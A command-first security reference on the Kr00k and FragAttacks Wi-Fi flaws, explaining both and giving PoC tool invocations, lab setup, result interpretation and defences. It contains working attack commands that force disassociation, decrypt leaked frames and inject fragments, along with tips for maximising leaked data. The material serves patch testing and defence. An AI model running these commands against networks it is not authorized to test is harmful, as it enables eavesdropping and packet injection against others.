# Kr00k & FragAttacks — Command-First Reference

> **Scope / authorization.** This is a mechanism + **defense/detection** reference for a
> local, allowlist-gated Wi-Fi audit toolkit. Everything here is for gear you own, a lab
> you control, or an engagement with written authorization (CTF / OSWP study / sanctioned
> window). Kr00k and FragAttacks are *passive-decrypt* and *injection* bugs in Wi-Fi chips
> and in the 802.11 standard itself — the point of running the PoCs below is to prove
> whether **your own** devices are patched, then to **harden** them. Only ever point these
> tools at a BSSID/client on your allowlist. No credential-harvesting, no third-party
> traffic. Both official tools require the network's credentials, so they are patch-test
> harnesses, not break-in tools.

---

## 0. TL;DR decision order (what a pro runs, in order)

1. **Inventory the silicon first.** Both bugs are *chipset/firmware/driver* problems. Before
   you test anything, list every radio you own and its Wi-Fi chip vendor (Broadcom, Cypress,
   Qualcomm, MediaTek, Realtek, Intel, Atheros/ath9k…). Kr00k ≈ Broadcom/Cypress FullMAC (+ a
   Qualcomm/MediaTek cleartext cousin); FragAttacks ≈ *everything*, including the standard
   itself (Vanhoef tested 75+ devices — every one was vulnerable to at least one variant).
2. **Patch-state check, not an attack.** The goal is a yes/no per device: "is this one still
   vulnerable?" Use the discoverers' own test scripts — `eset/malware-research/kr00k` and
   `akabe1/kr00ker` for Kr00k; `vanhoefm/fragattacks` (`fragattack.py`) for FragAttacks.
3. **Kr00k path (passive decrypt).** On a WPA2-CCMP 2.4 GHz network you own, force a disassoc,
   catch the frames flushed from the chip's TX buffer, try to decrypt with an **all-zero TK**.
   A decrypt that starts with the SNAP header `\xaa\xaa\x03\x00\x00\x00` = vulnerable. Defense
   = firmware/OS update; PMF does **not** stop the flaw itself.
4. **FragAttacks path (injection/exfil).** Prove injection works first, then run `fragattack.py`
   test-by-test against your AP (`client.conf`, no `--ap`) and against your clients (`--ap`).
   `TEST COMPLETED SUCCESSFULLY` = vulnerable to that specific CVE. **Retry every timeout** —
   the tool under-reports, and an unpatched/wrong driver can make a vulnerable stack look safe.
5. **Prioritise the design-flaw trio.** CVE-2020-24586/24587/24588 hit "basically everything"
   from WEP through WPA3 — test those across the whole fleet first, then the 9 impl CVEs.
6. **Prove the real-world risk where you've hardened.** E2E encryption (HTTPS+HSTS, VPN, SSH)
   blunts the *data-theft* path on both bugs even on an unpatched radio. Confirm sensitive
   traffic is already E2E-encrypted — that is the durable mitigation you control today.
7. **Promote to standing hygiene.** Patch cadence + "assume L2 is hostile" + harden the thing
   injection is *for* (host firewalls, pinned DNS, IoT segmentation). Re-test after every
   firmware bump; a vendor "fixed" claim is only as good as your own PASS→FAIL transition.

---

## 1. Concept (brief)

### 1a. Kr00k — CVE-2019-15126 (ESET: Čermák, Svorenčík, Lipovský, Feb 2020)

**One-line mechanism:** when a vulnerable Wi-Fi chip is **disassociated**, it clears the
Pairwise Transient Key (its **Temporal Key, TK**) in hardware to all zeros as part of session
teardown — **but it still transmits the frames already sitting in its TX buffer**, encrypting
them with that **all-zero TK (00:00…:00)**. Anyone in radio range who captures those frames
can decrypt them, because the key is known (all zeros). (ESET white paper; Wiz CVE DB.)

Key properties a defender must internalize:

- **It is not a handshake/PMK compromise.** The attacker never learns the Wi-Fi password or
  the PMK. Only the few kilobytes still buffered at disassoc time leak, re-encrypted under a
  key of zeros. "Decrypt **some** wireless packets" is the precise claim (ESET), not "break
  WPA2." Louder outlets ("breaks WPA2-Personal and -Enterprise") overstate it — the data at
  risk is whatever happened to be queued in the chip when the session tore down.
- **Disassoc is the trigger, and disassoc is cheap.** Disassociation happens naturally
  (roaming, interference, Wi-Fi toggled off, moving out of range) *and* can be **forced** by an
  unauthenticated attacker spraying deauth/disassoc frames — the classic management-frame
  injection primitive. Each forced disassoc flushes a fresh buffer, so the attack is *repeat
  to accumulate*: loop disassoc → flush → decrypt → repeat.
- **Relationship to KRACK.** ESET found Kr00k *while investigating why the Amazon Echo was
  vulnerable to KRACK*. Kr00k is **related to KRACK but fundamentally different**: KRACK
  (Vanhoef, 2017) forces a *key reinstallation* that resets nonces; Kr00k is one concrete
  real-world cause of the "all-zero key" state some KRACK tests observed — but Kr00k triggers
  on an ordinary disassoc, needs no 4-way-handshake manipulation, and leaks buffered data
  rather than enabling nonce-reuse replay.
- **Scope at disclosure:** Broadcom and Cypress **FullMAC** Wi-Fi chips — ESET's conservative
  estimate was **1 billion+ devices**: iPhones/iPads/Macs, many Androids, **Amazon Echo &
  Kindle**, **Raspberry Pi 3**, plus a large share of APs and routers (Asus, Huawei, and many
  that embed Broadcom/Cypress silicon). Disclosed under a **~120-day** coordinated grace
  period; Broadcom and Cypress shipped fixes and major OS vendors followed.
- **Follow-up — ESET "Beyond Kr00k" (Aug 2020):** the family has cleartext cousins in other
  silicon. These are **not** all-zero-key bugs — they skip encryption entirely:
  - **Qualcomm — CVE-2020-3702:** after disassoc the chip sends buffered data **in cleartext**
    even though the frame's "Protected" bit is set (seen on D-Link DCH-G020, Turris Omnia).
    Fixed in Qualcomm's proprietary driver July 2020; open-source `ath9k` devices may never
    get a vendor patch.
  - **MediaTek:** similar "encryption simply absent" behaviour (ASUS RT-AC52U; Microsoft Azure
    Sphere MT3620). Patched Mar–Apr 2020; Azure Sphere in OS 20.07.
  - **Realtek: not implicated by ESET's research.** Do **not** claim a Realtek Kr00k variant —
    your RTL8188EUS matters here only as the *testing radio*, not as a target class.

### 1b. FragAttacks — "FRagmentation and AGgregation attacks" (Vanhoef, USENIX Security 2021)

Paper: *Fragment and Forge: Breaking Wi-Fi Through Frame Aggregation and Fragmentation*
(USENIX Sec '21, pp. 161–178; IACR ePrint 2021/763).

**One-line mechanism:** 802.11 lets a frame be **fragmented** (split into pieces the receiver
reassembles) and lets small packets be **aggregated** (A-MSDU: many subframes inside one MAC
frame). The standard never properly bound *who* may mix fragments, under *which key*, or *how*
the "is-aggregated" flag is authenticated. That lets an attacker **inject** chosen packets into
an otherwise-protected network, and — under specific conditions — **exfiltrate** a victim's
data. The flaws affect **all protected Wi-Fi from WEP through WPA3**; Vanhoef tested **75+
devices and every one was affected by at least one** variant. (fragattacks.com; USENIX paper.)

**12 CVEs, two classes.** Three are **design flaws in the 802.11 standard** (affect nearly
every device ever made, back to Wi-Fi's 1997 debut); nine are widespread **implementation
flaws** (sloppy stacks that accept things the standard never authenticated):

| CVE | Class | What it is (precise wording) |
|---|---|---|
| **CVE-2020-24588** | Design | **Aggregation attack** — a device **accepts non-SPP A-MSDU frames**; the "is-aggregated" flag is *not* authenticated, so a normal frame can be re-parsed as aggregated subframes → packet injection. |
| **CVE-2020-24587** | Design | **Mixed-key attack** — receiver **reassembles fragments decrypted under different keys** (across a PTK rekey). |
| **CVE-2020-24586** | Design | **Fragment-cache attack** — fragments are **not cleared from memory when a client (re)connects/disconnects**, so a planted fragment merges with a victim's. |
| CVE-2020-26139 | Impl | Forwards **EAPOL frames from a not-yet-authenticated sender** (mainly affects APs; e.g. some hostapd/NetBSD). |
| CVE-2020-26140 | Impl | Accepts **plaintext data frames** in a protected network. |
| CVE-2020-26141 | Impl | Does **not verify the TKIP MIC** of fragmented frames. |
| CVE-2020-26142 | Impl | Processes **fragmented frames as full (unfragmented) frames**. |
| CVE-2020-26143 | Impl | Accepts **fragmented plaintext** data frames in a protected network. |
| CVE-2020-26144 | Impl | Accepts **plaintext A-MSDU frames that start with an EAPOL-type RFC1042 header** ("cloaked"/EAPOL A-MSDU). |
| CVE-2020-26145 | Impl | Accepts **plaintext broadcast fragments as full frames** in an encrypted network. |
| CVE-2020-26146 | Impl | Reassembles **encrypted fragments with non-consecutive packet numbers**. |
| CVE-2020-26147 | Impl | Reassembles **mixed encrypted + plaintext** fragments. |

**What the injection primitive actually buys the attacker (the demos Vanhoef shipped):**
- **Rogue DNS** — inject an **ICMPv6 Router Advertisement** so the victim adopts an
  attacker-controlled DNS server; *"practically all devices we tested were vulnerable"* to
  this. From there, redirect the victim anywhere.
- **NAT/firewall hole-punch → stepping stone** — plaintext injection *toward the AP/router*
  can **bypass the NAT/firewall**; the concrete technique is injecting a **TCP SYN with the
  source = a sensitive internal service and destination = an attacker endpoint**, which creates
  a NAT/firewall mapping that lets the attacker then reach the internal host. Demo: take over
  an outdated **Windows 7** machine inside the LAN.
- **IoT control** — remotely toggle an insecure **smart power socket** on/off.
- **Data interception (aggregation flaw)** — capture a victim's credentials, *but only under
  certain conditions*; when the site uses **HSTS, "the transmitted data cannot be stolen."**

**Why a defender cares, and why not to panic:**
- The **design** CVEs are *hard to exploit*: they need a **multi-channel machine-in-the-middle**
  position and sometimes user interaction or unusual settings. The bigger practical worry is
  the **implementation** flaws — **several are "trivial to exploit"** on sloppy stacks.
- The flaws work **the same regardless of auth method** — WPA2-PSK, WPA3-SAE, or enterprise
  EAP (including **EAP-TLS**) all behave identically, because the bugs live below the key
  exchange, in frame parsing/reassembly.

---

## 2. Lab prerequisites (Mac + Kali + TP-Link RTL8188EUS)

**Adapter reality check.** Your TP-Link RTL8188EUS is a **2.4 GHz-only**, `rtl8xxxu`/`8188eu`
injection-capable NIC. It is fine as a **capture + disassoc-injection** radio for the **Kr00k**
PoC (which is explicitly **2.4 GHz WPA2-AES-CCMP only**, and `akabe1/kr00ker` was itself tested
on the very similar **TL-WN722N**). It is **not** on the FragAttacks "known-good" list, and
FragAttacks' *mixed mode* needs **patched drivers** that Vanhoef's `fragattacks-drivers58` tree
only ships for specific chipsets. So:

- **Kr00k PoC:** RTL8188EUS in monitor mode is workable. Mac drives Kali (VM @ 192.168.64.2)
  with the adapter USB-passthrough'd to Kali.
- **FragAttacks PoC:** budget for a supported card. Vanhoef's recommendation and rankings:
  - **Alfa AWUS036ACM (mt76)** — *the* recommended card; works in **mixed mode**.
  - **AWUS036ACH — not recommended;** needs `--no-drivercheck` + `--inject wlan0` and **does
    not work in mixed mode**.
  - **Intel AX200 — incompatible;** its firmware **crashes after injecting a frame with the
    More-Fragments flag set**, which breaks the fragmentation tests.
  - **ath9k_htc** cards (e.g. TL-WN722N v1) work but need **patched firmware** via
    `research/ath9k-firmware/install.sh` + reboot, in addition to the patched driver.
- **Kernel:** reference is **Ubuntu 20.04 / kernel 5.8**; **only kernels ≤ 5.12 are supported**.
  Do not fight a 6.x build — pin the kernel and snapshot the VM once it builds.
- **Channel width:** use a **20 MHz** channel; injection on wider channels is untested.

Standard monitor-mode bring-up in Kali (on the device/BSSID you own only):

```bash
sudo airmon-ng check kill                 # stop NetworkManager/wpa_supplicant interfering
sudo airmon-ng start wlan0                # -> wlan0mon  (or: iw dev wlan0 set type monitor)
sudo iw dev wlan0mon set channel 6        # lock to YOUR AP's channel (Kr00k = 2.4 GHz)
iw dev                                     # confirm 'type monitor' + channel
aireplay-ng --test wlan0mon               # PROVE injection before trusting any result
```

---

## 3. Kr00k — detection / PoC workflow (own gear, 2.4 GHz WPA2-CCMP)

### 3a. Option A — ESET's official test script (the authoritative yes/no)

```bash
git clone https://github.com/eset/malware-research.git
cd malware-research/kr00k
# read the folder README for exact invocation; it ships the harness ESET used to
# confirm/deny Kr00k AND the Beyond-Kr00k variants (Qualcomm CVE-2020-3702, MediaTek
# cleartext-flush). Use it as ground truth — it was written by the discoverers.
```

### 3b. Option B — `akabe1/kr00ker` PoC (Maurizio Siddu) — watch the decrypt happen

Dependencies and setup:

```bash
pip3 install scapy pycryptodomex           # scapy + Cryptodome (NOT the old pycrypto)
git clone https://github.com/akabe1/kr00ker.git
cd kr00ker
# interface MUST be in monitor mode (section 2) and you MUST run as root
sudo python3 kr00ker.py --help
```

Flags (verbatim semantics from the README):

| Flag | Meaning |
|---|---|
| `-i` | wireless interface in monitor mode (e.g. `wlan0mon`) |
| `-b` | **BSSID** of the AP (yours) |
| `-c` | **client** MAC (yours) |
| `-n` | number of disassociation frames to send |
| `-r` | disassociation **reason** ID |
| `-t` | target: `client` or `ap` |
| `-w` | Wi-Fi **channel** of the WPA2-CCMP network |
| `-d` | delay (seconds) between rounds |
| `--help` | list all options |

Full template (README):

```bash
python3 kr00ker.py -i <iface> -b <BSSID> -c <client-MAC> -n <num> -r <reason> -t <client|ap> -w <chan> -d <delay>
```

Run against **a client you own** — reason 3, 2 s delay, 5 disassoc frames, channel 2:

```bash
sudo python3 kr00ker.py -i wlan0mon -b AA:AA:AA:AA:AA:AA -c CC:CC:CC:CC:CC:CC \
     -n 5 -r 3 -t client -w 2 -d 2
```

Run against **an AP you own** with README defaults (reason 7, delay 4 s, 1 frame), channel 11:

```bash
sudo python3 kr00ker.py -i wlan0mon -b AA:AA:AA:AA:AA:AA -c CC:CC:CC:CC:CC:CC \
     -t ap -w 11
```

**How you know it worked:** on success the tool **hexdumps the decrypted data and writes a
pcap**. A correctly decrypted LLC/SNAP payload **begins with `\xaa\xaa\x03\x00\x00\x00`** (the
RFC1042 SNAP header). That constant appearing after an all-zero-TK CCMP decrypt is your
"vulnerable" signal. Garbage after decrypt = the TK wasn't all-zero → likely patched.

**Why it needs repeats:** only frames *already buffered* at disassoc time leak, and a vulnerable
chip "may not buffer enough data." Generate traffic on the victim first (a video call, a large
download, a stream) so the buffer is full when you flush it, and loop the disassoc. This is
exactly why **more disassoc rounds (`-n`) + short `-d`** extract more per session.

### 3c. Kr00k — gotchas / pitfalls

- **2.4 GHz + WPA2-AES-CCMP only** for `kr00ker`. WPA3, TKIP-only, or a 5 GHz test will not
  reproduce it. Lock the channel; a *scanning* radio misses the flushed burst.
- **PMF/802.11w does NOT fix the flaw.** The zero-key flush happens on *any* disassoc, including
  legitimate ones; management-frame protection doesn't stop buffered data being flushed under a
  zero key. PMF only makes it harder to *force* the disassoc — friction, not a cure.
- **One adapter was validated** by the PoC author (TL-WN722N). Other injectors "should" work;
  confirm your RTL8188EUS injects (`aireplay-ng --test wlan0mon`) before trusting a negative.
- **Empty/short capture ≠ patched.** Under-buffering produces false negatives. Drive traffic,
  raise `-n`, retry, and cross-check with the ESET script before declaring a device safe.
- **Beyond-Kr00k variants look different on the wire:** Qualcomm/MediaTek flush **cleartext**
  (no all-zero decrypt needed — the data is already readable with the Protected bit set). If a
  device isn't Broadcom/Cypress, test with the ESET script, which covers these.

---

## 4. FragAttacks — detection / PoC workflow (`vanhoefm/fragattacks`)

### 4a. Build & environment (per the official README)

```bash
# Ubuntu 20.04 / kernel 5.8 reference; kernel MUST be <= 5.12.
git clone https://github.com/vanhoefm/fragattacks.git
cd fragattacks
sudo apt install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git \
     sysfsutils python3-venv iw macchanger aircrack-ng rfkill
cd research
./build.sh        # rebuild after EVERY git pull
./pysetup.sh      # rebuild after EVERY git pull

# patched drivers (needed for MIXED mode) — from the sibling tree:
git clone https://github.com/vanhoefm/fragattacks-drivers58.git
cd fragattacks-drivers58
make defconfig-wifi          # (or: make defconfig-experiments  = only the tested cards)
make -j4 && sudo make install && sudo reboot
# ath9k_htc ONLY: also flash patched firmware, then reboot:
#   cd fragattacks/research/ath9k-firmware && sudo ./install.sh && sudo reboot

cat /sys/module/mac80211/parameters/fragattack_version   # file EXISTS only if patched drv is live
```

Every working session:

```bash
cd research
sudo su
source venv/bin/activate
./droptraffic.sh          # block the host's own outgoing traffic so it won't pollute tests
sudo airmon-ng check      # see interfering procs; also disable Wi-Fi in NetworkManager
```

### 4b. Invocation modes

```bash
./fragattack.py wlan0 [--ap] $COMMAND                  # MIXED mode (1 card; needs patched drv)
./fragattack.py wlan0 --inject wlan1 [--ap] $COMMAND   # INJECTION mode (2 cards; wlan1 injects)
./fragattack.py wlan0 --hwsim wlan1,wlan2 [--ap] $CMD  # HWSIM (experimental / research only)

# static-IP variant (skip DHCP):
./fragattack.py wlan0 [--ap] ping --inject wlan1 --ip 192.168.100.10 --peerip 192.168.100.1
```

- **Mixed mode** is the README's recommended mode (needs the patched driver on the one card).
- **Injection mode** does **not** need a patched driver *on the injector* — but the injector
  card must still be on the supported list.
- **Testing YOUR AP:** edit `research/client.conf` (a normal `wpa_supplicant` config: SSID,
  PSK; for WPA3 add `key_mgmt=SAE`, `ieee80211w=1`). Run **without** `--ap`.
- **Testing YOUR CLIENT:** run **with** `--ap`. The tool stands up an AP `testnetwork` /
  password `abcdefgh`; connect the client to it. Edit `research/hostapd.conf` (channel; for
  WPA3 clients `wpa_key_mgmt=SAE`, `ieee80211w=2`).

### 4c. Prove injection first (never skip this)

```bash
./fragattack.py wlan0 ping --inject-test wlan1            # client side
./fragattack.py wlan0 ping --inject-test wlan1 --ap       # AP side
./fragattack.py wlan0 ping --inject-test-postauth wlan1   # also exercises retransmission
./test-injection.py wlan0 wlan1                           # standalone injection check
```

A dishonest card (one that silently rewrites sequence/fragment numbers, reorders, or drops
More-Fragments frames) makes **every** downstream result meaningless — usually a false "secure."

### 4d. The core test matrix (exact `$COMMAND`s, grouped by CVE)

```bash
# --- Sanity (MUST pass or your setup is wrong) ---
./fragattack.py wlan0 ping                 # basic connectivity
./fragattack.py wlan0 ping I,E,E           # fragmented ping; if it fails try --icmp-size 100

# --- Device-behaviour probes (predict later results) ---
./fragattack.py wlan0 ping I,E,E --delay 5 # does the stack accept slow fragmentation?
./fragattack.py wlan0 ping-frag-sep        # if THIS fails, mixed-key & cache tests will too
./fragattack.py wlan0 ping-frag-sep --pn-per-qos

# --- A-MSDU / aggregation design flaw (CVE-2020-24588) ---
./fragattack.py wlan0 ping I,E --amsdu
./fragattack.py wlan0 amsdu-inject
./fragattack.py wlan0 amsdu-inject-bad

# --- Mixed-key design flaw (CVE-2020-24587) ---
./fragattack.py wlan0 ping I,F,BE,AE
./fragattack.py wlan0 ping I,F,BE,AE --pn-per-qos
#   (vs an AP: the AP must rekey the PTK; if it won't, add --rekey-req)

# --- Fragment-cache design flaw (CVE-2020-24586) ---
./fragattack.py wlan0 ping I,E,R,AE
./fragattack.py wlan0 ping I,E,R,E
./fragattack.py wlan0 ping I,E,R,AE --full-recon      # deauth (not disassoc) on reconnect
./fragattack.py wlan0 ping I,E,R,E   --full-recon

# --- Mixed plain/encrypted & plaintext-accept (CVE-2020-26147 / 26140 / 26143) ---
./fragattack.py wlan0 ping I,E,P
./fragattack.py wlan0 ping I,P,E
./fragattack.py wlan0 ping I,P
./fragattack.py wlan0 ping I,P,P
./fragattack.py wlan0 linux-plain

# --- Non-consecutive packet numbers (CVE-2020-26146) ---
./fragattack.py wlan0 ping I,E,E --inc-pn 2

# --- Broadcast plaintext fragment (CVE-2020-26145) ---
./fragattack.py wlan0 ping I,D,P --bcast-ra
./fragattack.py wlan0 ping D,BP   --bcast-ra          # 'BP' => confirm on victim w/ sniffer

# --- Cloaked / EAPOL A-MSDU (CVE-2020-26144) ---
./fragattack.py wlan0 eapol-amsdu I,P
./fragattack.py wlan0 eapol-amsdu BP                  # 'BP' => observe on victim w/ sniffer
./fragattack.py wlan0 eapol-amsdu-bad I,P
./fragattack.py wlan0 eapol-amsdu-bad BP
```

### 4e. Extended test matrix (deeper per-CVE coverage, from the README's section tests)

```bash
# A-MSDU (fake-flag + SPP variants)
./fragattack.py wlan0 ping I,E --amsdu-fake
./fragattack.py wlan0 ping I,E --amsdu-fake --amsdu-spp

# Mixed-key (rekey timing / plaintext-rekey / BSD stack quirks)
./fragattack.py wlan0 ping I,F,BE,E
./fragattack.py wlan0 ping I,E,F,AE
./fragattack.py wlan0 ping I,E,F,AE --rekey-plain
./fragattack.py wlan0 ping I,E,F,AE --rekey-plain --rekey-req
./fragattack.py wlan0 ping I,E,F,AE --rekey-early-install
./fragattack.py wlan0 ping I,E,F,E  --rekey-plain --rekey-req
./fragattack.py wlan0 ping I,F,BE,AE --freebsd

# Fragment-cache (FreeBSD / AP-only-reconnect variants)
./fragattack.py wlan0 ping I,E,R,AE --freebsd --full-reconnect
./fragattack.py wlan0 ping I,E,R,AP --freebsd --full-reconnect
./fragattack.py wlan0 ping I,E,R,AP --full-reconnect

# Mixed plain/encrypt (A-MSDU + 3-fragment variants)
./fragattack.py wlan0 ping I,E,E --amsdu
./fragattack.py wlan0 ping I,E,P,E
./fragattack.py wlan0 linux-plain 3

# Broadcast (uni/broadcast dst variants)
./fragattack.py wlan0 ping I,P --bcast-ra
./fragattack.py wlan0 ping BP --bcast-ra --bcast-dst
./fragattack.py wlan0 ping BP --bcast-dst
./fragattack.py wlan0 eapfrag BP,BP                   # experimental; variant: eapfrag BP,AE

# EAPOL A-MSDU broadcast
./fragattack.py wlan0 eapol-amsdu BP --bcast-dst
./fragattack.py wlan0 eapol-amsdu-bad BP --bcast-dst

# AP forwards EAPOL from unauthenticated sender (CVE-2020-26139; AP-only)
./fragattack.py wlan0 eapol-inject 00:11:22:33:44:55
./fragattack.py wlan0 eapol-inject-large 00:11:22:33:44:55

# No-fragmentation-support probe
./fragattack.py wlan0 ping I,D,E
./fragattack.py wlan0 ping I,E,D
```

### 4f. Action-letter grammar (how to read `I,F,BE,AE`)

Comma-separated actions in the `ping` argument. One `E`/`P` = one frame; **multiple `E`/`P`
actions fragment the ping, one fragment per action**:

| Symbol | Meaning |
|---|---|
| `I` | **I**nitialise — obtain an IP first (DHCP by default; skipped if `--ip`/`--peerip` set) |
| `E` | inject an **E**ncrypted fragment/packet |
| `P` | inject a **P**laintext fragment/packet |
| `F` | re**F**resh the session key (do a 4-way rekey as AP, or wait for one as client) |
| `R` | make the client **R**econnect |
| `D` | a **D**ecoy/empty fragment that is *not actually sent* (spread over the remaining E/P), e.g. `I,D,E` = a fragment with no first fragment |

**Timing prefixes** (attach to `E`/`P`, e.g. `BE`, `AE`, `BP`) pin *when* the frame is sent
relative to the handshake:

| Prefix | When |
|---|---|
| `S` | during handshake **messages 1–2** |
| `B` | during handshake messages 3–4 (i.e. **B**efore install completes) |
| `A` | immediately **A**fter the handshake |
| `C` | one second after connecting (**C**onnected; tune with `--connected-delay`) |

So `ping I,E,R,AE` = get IP, send an encrypted frag, reconnect, then send an encrypted frag
*after* the new handshake — the cache-poison sequence. `ping I,F,BE,AE` = get IP, force a
rekey, send an encrypted frag *before* the new key installs and another *after* — the mixed-key
sequence.

### 4g. Interpreting FragAttacks results (where people go wrong)

- **Vulnerable:** the tool prints **`TEST COMPLETED SUCCESSFULLY`**.
- **Likely not vulnerable:** **`Test timed out! Retry to be sure, or manually check result`**.
  The README is emphatic: **retry negatives** before concluding — it under-reports. The tool
  exits on completion/timeout; otherwise CTRL+C.
- **`BP`-suffixed, broadcast, and `eapol-amsdu BP` tests can't self-confirm.** You must sniff
  the **victim** with tcpdump/Wireshark **from managed/AP mode (not monitor mode)**. Filter
  `icmp`, or `frame contains "test_ping_icmp"`. For an AP under test, `--bcast-dst` lets a
  *second* connected client observe the result.
- **`ping-frag-sep` is a predictor:** if it fails, the **mixed-key and cache attacks will
  probably fail too**. Use `ping-frag-sep --pn-per-qos` to separate PN-checking behaviour from
  the rest.
- **A "secure" result can be a lie.** Some NICs silently rewrite sequence/fragment numbers or
  reorder frames, making a vulnerable stack look safe. Confirm your injection card is honest
  (§4c) and, for high-assurance work, back the test with a firmware/code audit — don't trust a
  single PASS.
- **Sanity gate:** if plain `ping` fails, nothing downstream is trustworthy. If `ping I,E,E`
  fails, try `--icmp-size 100`; if that fixes it, pass it to *every* subsequent test.

### 4h. FragAttacks — gotchas / pitfalls

- **Fragment timeout ≈ 2 s on Linux.** The kernel drops a held fragment after ~2 seconds, so
  long `--delay` values make tests fail *trivially* (not because the device is safe). Use
  `--delay 1.5` or lower; probe the max accepted delay before trusting a timeout.
- **Sleeping clients miss injected frames.** Disable power-save/sleep on the device under test,
  use **mixed mode** (which queues frames), or use static IPs (`--ip`/`--peerip`).
- **Intel devices send Block-Ack frames between fragments**, which can break defragmentation.
  Watch with a second monitor interface; it produces spurious negatives.
- **Mixed-key needs a rekey.** An AP must renew its PTK periodically; if not, add `--rekey-req`.
  The tool prints `Client cannot force rekey. Waiting on AP to start PTK rekey` while waiting.
- **Cache attacks on clients:** some clients handle disassociation poorly — use `--full-reconnect`
  (deauth instead of disassoc); disabling the client's other saved networks helps it reconnect.
- **Run broadcast & cache tests several times.** Background noise causes spurious fails, and
  some cache tests fail even on genuinely vulnerable devices.
- **Rebuild after every pull:** `./build.sh && ./pysetup.sh`. Re-run `./droptraffic.sh` each
  session. Hardware: **20 MHz channel**, honest supported card, kernel ≤ 5.12.

---

## 5. Defense (the actual product)

### 5a. Kr00k defense

1. **Patch the firmware/OS — this is the only real fix.** Broadcom/Cypress shipped fixes under
   ESET's ~120-day window; Apple, Amazon, the Pi Foundation, and router vendors followed.
   Cisco Meraki states it plainly: *no mitigation exists — a firmware upgrade is required.*
   Qualcomm (CVE-2020-3702) fixed its proprietary driver July 2020; MediaTek Mar–Apr 2020.
   Re-run the ESET script after each update to confirm the PASS→FAIL transition.
2. **Assume L2 is hostile → ride end-to-end encryption.** Even on an unpatched radio, Kr00k only
   exposes link-layer-encrypted bytes; **TLS/HTTPS, VPN, and SSH tunnels stay safe** (Meraki,
   Ezurio). Ezurio's interim guidance for the still-unpatched **BCM4329 (40-series)** is exactly
   this: *use TLS — TLS-tunnelled data is not at risk.* Push VPN + HTTPS-everywhere policy.
3. **Reduce forced disassocs** (defence-in-depth, not a cure): **802.11w/PMF** makes it harder to
   spam deauth/disassoc to *force* buffer flushes. It does **not** fix the zero-key flush on
   legitimate disassocs — PMF = friction, patch = fix.
4. **Retire chips that will never be patched** (old IoT on BCM4329 etc.) or segment them onto a
   VLAN where only E2E-encrypted traffic flows.

### 5b. FragAttacks defense

1. **Patch — drivers, firmware, OS, and AP.** Microchip, Cisco, Intel, Aruba, Linux
   (`mac80211`), Android, Windows, Apple and others shipped fixes starting May 2021. For the
   three **design** CVEs there is no config toggle — only a patched stack enforces the new
   rules: **authenticate the "is-aggregated" flag; reassemble only fragments decrypted with the
   same key; clear the fragment cache on connect and disconnect.** Microchip example: WILC Linux
   fw/driver **≥ 15.6**, WINC15x0/MR210 fw **≥ 19.7.6**.
2. **End-to-end encryption blunts the *data-theft* path.** Vanhoef's headline user mitigation:
   **HTTPS everywhere + enable HSTS** (with HSTS, *"the transmitted data cannot be stolen"*). A
   **VPN** helps against **data exfiltration** — but note Vanhoef's own caveat: a **VPN does not
   stop the *direct device attacks*** (NAT hole-punch / IoT control still reach the host).
3. **Do NOT rely on 802.11w/PMF or EAP-TLS for these bugs.** This is the biggest correction most
   write-ups get wrong: fragattacks.com states outright **"neither 802.11w nor EAP-TLS stops
   these attacks."** The design-flaw attacks assume a **multi-channel MitM**, which 802.11w does
   not prevent; and the flaws behave identically under enterprise EAP. (PMF/WPA3 are still worth
   running for *other* reasons — just not as a FragAttacks fix.)
4. **Harden the thing injection is *for*.** The scary chains use injection to reach an internal
   host or poison DNS, so: keep **host firewalls** on; don't treat the router's NAT as a security
   boundary; **pin a trusted DNS and use DoH/DoT** so an injected ICMPv6 RA can't silently
   redirect resolution; segment IoT; patch/retire LAN hosts (the demo popped Windows 7).
5. **Reduce Wi-Fi exposure where you can (partial only):** disabling fragmentation, pairwise
   rekeys, and dynamic fragmentation (Wi-Fi 6) *mitigates some* variants but **does not fully
   prevent** the attacks — treat as hardening, not a fix.
6. **Verify, don't assume.** Re-run the `fragattack.py` matrix after patching each AP and client;
   a vendor "fixed" claim is only as good as your own PASS→FAIL on the test.

### 5c. Shared detection / monitoring notes (defensive)

- **No clean single Wireshark filter flags Kr00k/Qualcomm-variant exploitation in the wild**
  (public sources define none). The observable *precursor* is the same deauth/disassoc storm an
  evil twin uses: `wlan.fc.type_subtype == 0x0c` (deauth) / `0x0a` (disassoc), especially bursts
  from/to your BSSID. Alert on that storm (**Kismet `DEAUTHFLOOD`**, **nzyme** disconnection-frame
  monitor) as early warning that *someone is forcing the trigger*.
- **Confirming Kr00k on a capture** means *test-decrypting* post-disassoc CCMP data frames with an
  all-zero TK and looking for the `\xaa\xaa\x03\x00\x00\x00` SNAP header (what `kr00ker`
  automates). That is lab verification of your own capture, not a passive IDS rule.
- **FragAttacks custom detections:** the injection itself is hard to spot generically; the
  defensible signals are (a) **plaintext data frames inside a protected BSS** (CVE-2020-26140/
  26143/26145 precursors), and (b) **A-MSDU frames whose first subframe carries an RFC1042/EAPOL
  header** (the CVE-2020-26144 "cloaked" shape). Pair any detector with your patch inventory and
  your own test results — those are the trustworthy ground truth.

---

## 6. Pro tips (speed & accuracy)

- **Test patch-state, don't "attack."** Frame every run as "prove this device is fixed." The
  ESET + Vanhoef scripts exist precisely to give a deterministic yes/no — use them before rolling
  your own, and keep a **per-device results log** so a firmware bump's effect is visible.
- **Fill the buffer before you flush it (Kr00k).** Start a stream/large transfer on the target,
  *then* disassoc. More buffered data = more decrypt per round. Loop `-n` with short `-d`.
- **Prove injection first (both bugs).** `aireplay-ng --test` for the RTL8188EUS; `--inject-test`
  / `--inject-test-postauth` / `test-injection.py` for FragAttacks. A dishonest card = meaningless
  results both ways (false "safe" on FragAttacks, no flush capture on Kr00k).
- **Let `ping-frag-sep` triage FragAttacks.** If it fails, don't waste time on mixed-key/cache —
  fix the setup (delay, card, sleep) first; those tests depend on the same reassembly path.
- **Pin the kernel for FragAttacks (≤ 5.12)** with the `fragattacks-drivers58` tree; snapshot a
  working Kali VM state once it builds. Don't fight a 6.x build.
- **Right card for the job.** RTL8188EUS = fine for the 2.4 GHz Kr00k PoC; get an **AWUS036ACM
  (mt76)** for FragAttacks mixed mode. Avoid AWUS036ACH (no mixed mode) and AX200 (crashes on
  More-Fragments).
- **Watch the ~2 s Linux fragment timeout.** Keep `--delay` ≤ ~1.5 s or FragAttacks tests fail
  *trivially* and masquerade as "patched."
- **Retry everything that times out.** Both tools under-report. One timeout = "inconclusive,"
  never "safe." Three clean negatives + a confirmed-patched firmware version = safe.
- **Prioritise the design trio (24586/24587/24588)** — they hit "basically everything" from WEP
  to WPA3. Sweep those across the fleet first, then the 9 impl CVEs.
